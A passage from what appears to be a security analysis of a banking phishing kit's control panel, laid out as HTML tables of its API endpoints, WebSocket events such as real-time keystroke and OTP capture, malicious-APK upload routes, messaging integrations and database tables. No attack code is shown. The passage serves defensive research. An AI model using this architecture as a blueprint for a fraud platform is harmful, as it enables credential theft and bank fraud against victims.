style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Endpoint</strong></p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Description</strong></p></td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">POST</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/login</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Operator login (sends deviceId)</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">POST</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/register</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">POST</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/logout</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">POST</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/forgot-password</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">POST</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/reset-password</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">POST</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/verify-2fa</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">GET</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/user</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">GET</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/users</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">GET</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/users/regular</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">GET</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/admin/users</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">POST</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/toggle-user-status/:username</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">POST</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/users/cleanup-expired</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">PATCH</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/users/:userId/custom-price</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr></tbody></table></figure><p>&nbsp;</p><p><strong>8.2 Executive Management (Call Center)</strong></p><p>&nbsp;</p><figure class=\"table\" style=\"float:left;\"><table class=\"ck-table-resized\" style=\"border-style:none;\"><colgroup><col style=\"width:33.33%;\"><col style=\"width:33.33%;\"><col style=\"width:33.34%;\"></colgroup><tbody><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Method</strong></p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Endpoint</strong></p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Description</strong></p></td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">POST</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/executives</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">PUT</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/executives/:id</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">DELETE</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/executives/:id</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">POST</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/executive/login</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">POST</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/executive/verify-otp</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr></tbody></table></figure><p>&nbsp;</p><p><strong>8.3 Victim Session Management</strong></p><p>&nbsp;</p><figure class=\"table\" style=\"float:left;\"><table class=\"ck-table-resized\" style=\"border-style:none;\"><colgroup><col style=\"width:33.33%;\"><col style=\"width:33.33%;\"><col style=\"width:33.34%;\"></colgroup><tbody><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Method</strong></p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Endpoint</strong></p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Description</strong></p></td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">GET</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/sessions</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Filter by saved / current</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">POST</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/sessions/:id/save</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">DELETE</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/sessions/:id</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">DELETE</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/sessions</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">GET</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/generate-link?banco=:banco</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Generate unique link per bank</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">POST</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/links</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">POST</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/admin/links/encargado</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">POST</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/links/:id/extend</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Extend link lifetime (30-min blocks)</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">POST</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/links/:id/cancel</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">GET</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/links/active-sessions</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">GET</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/links/history</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr></tbody></table></figure><p><strong>8.4 File Exfiltration (KYC / Malware)</strong></p><p>&nbsp;</p><figure class=\"table\" style=\"float:left;\"><table class=\"ck-table-resized\" style=\"border-style:none;\"><colgroup><col style=\"width:33.33%;\"><col style=\"width:33.33%;\"><col style=\"width:33.34%;\"></colgroup><tbody><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Method</strong></p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Endpoint</strong></p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Description</strong></p></td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">POST</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/upload-identity-files</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Upload ID/Passport/Selfie</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">POST</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/upload-protection-file</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Upload malicious APK</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">DELETE</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/remove-protection-file/:id</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">POST</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/upload-apk</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">POST</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/assign-apk</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">GET</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/get-user-apk/:id</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr></tbody></table></figure><p>&nbsp;</p><p><strong>8.5 Communication (SMS / WhatsApp / Telegram)</strong></p><p>&nbsp;</p><figure class=\"table\" style=\"float:left;\"><table class=\"ck-table-resized\" style=\"border-style:none;\"><colgroup><col style=\"width:33.33%;\"><col style=\"width:33.33%;\"><col style=\"width:33.34%;\"></colgroup><tbody><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Method</strong></p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Endpoint</strong></p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Description</strong></p></td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">POST</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/sms/send</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">GET</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/sms/credits</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">POST</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/sms/credits/add</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">GET</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/sms/history</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">POST</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/telegram/send-admin-message</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">POST</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/telegram/send-direct-message</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">PUT</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/users/:username/chat-id</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">GET</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/whatsapp/config</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">POST</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/whatsapp/config</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">GET</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/whatsapp/menu</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">POST</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/whatsapp/menu</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">PUT</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/whatsapp/menu/:id</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">GET</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/whatsapp/status</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">POST</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/whatsapp/start</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">POST</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/whatsapp/stop</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">POST</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/whatsapp/send-test</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr></tbody></table></figure><p>&nbsp;</p><p><strong>8.6 Global Configuration</strong></p><p>&nbsp;</p><figure class=\"table\" style=\"float:left;\"><table class=\"ck-table-resized\" style=\"border-style:none;\"><colgroup><col style=\"width:33.33%;\"><col style=\"width:33.33%;\"><col style=\"width:33.34%;\"></colgroup><tbody><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Method</strong></p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Endpoint</strong></p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Description</strong></p></td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">GET</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/site-config</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">POST</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/site-config</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">GET</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/system-config</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">POST</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/system-config</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">GET</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/screen-flows</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">PUT</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/screen-flows/:banco</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Controls screen flow per bank</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">GET</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/user-flows/:banco</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">POST</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">/api/user-flows</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">&nbsp;</td></tr></tbody></table></figure><p>&nbsp;</p><h2><strong>9. WebSocket Channel — Real-Time Events (/ws)</strong></h2><figure class=\"table\" style=\"float:left;\"><table class=\"ck-table-resized\" style=\"border-style:none;\"><colgroup><col style=\"width:33.33%;\"><col style=\"width:33.33%;\"><col style=\"width:33.34%;\"></colgroup><tbody><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Event</strong></p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Direction</strong></p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Description</strong></p></td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">REGISTER</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Client → C2</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Defines whether the connecting party is&nbsp;ADMIN or&nbsp;CLIENT</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">INIT_SESSIONS</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">C2 → Admin</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Loads active sessions into the panel</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">SESSIONS_UPDATED</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">C2 → Admin</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Updates victim list</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">SESSION_UPDATE</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">C2 → Admin</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">State change in a session</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">SESSION_DELETE</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">C2 → Admin</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Session terminated</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">CLIENT_STATUS</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Client → C2</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Notifies whether victim is online</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">CLIENT_INPUT</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Client → C2</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Sends data entered by victim</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">CLIENT_INPUT_REALTIME</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Client → C2</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><strong>Live keystrokes</strong> — passwords, tokens, card numbers</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">SCREEN_CHANGE</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">C2 → Client</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Changes the screen the victim sees</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">SESSIONS_CLEANUP</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">C2 → Admin</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Auto-cleanup notification (sessions older than 5 days)</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">SMS_COMPRA_CODE</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">C2 → Admin</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Real-time alert when victim enters cancellation OTP</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">PING</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Client → C2</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Keep-alive sent every 25 seconds</td></tr></tbody></table></figure><p>&nbsp;</p><h2><strong>9. Technical Architecture</strong></h2><h3><strong>9.1 Stack</strong></h3><ul><li><strong>Frontend:</strong> React + Vite (compiled bundle), Tailwind CSS, shadcn/ui, TanStack Query</li><li><strong>Backend ORM:</strong> Drizzle ORM on PostgreSQL (full schema visible in bundle)</li><li><strong>Real-time:</strong> Native WebSocket with automatic reconnection and PING every 25 seconds</li><li><strong>Authentication:</strong> JWT stored in&nbsp;localStorage under the key&nbsp;authToken</li><li><strong>Validation:</strong> Zod (full schemas of all entities exposed in the bundle)</li></ul><h3><strong>9.2 Database Schema (Exposed via Drizzle ORM)</strong></h3><p>The bundle exposes the complete Drizzle ORM schema. Identified tables:</p><figure class=\"table\" style=\"float:left;\"><table class=\"ck-table-resized\" style=\"border-style:none;\"><colgroup><col style=\"width:50%;\"><col style=\"width:50%;\"></colgroup><tbody><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Table</strong></p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Purpose</strong></p></td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">users</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Kit operators (criminal affiliates)</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">sessions</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Victim sessions with all stolen data</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">executives</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Office plan sub-operators</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">registered_devices</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Authorized devices per user (max. 2)</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">devices</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Devices linked to access keys</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">access_keys</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Access keys with device limits</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">sms_credits</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">SMS credit balance per user</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">sms_history</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">History of sent SMS messages</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">sms_config</td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Sofmex API configuration</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">voip_config</td><td 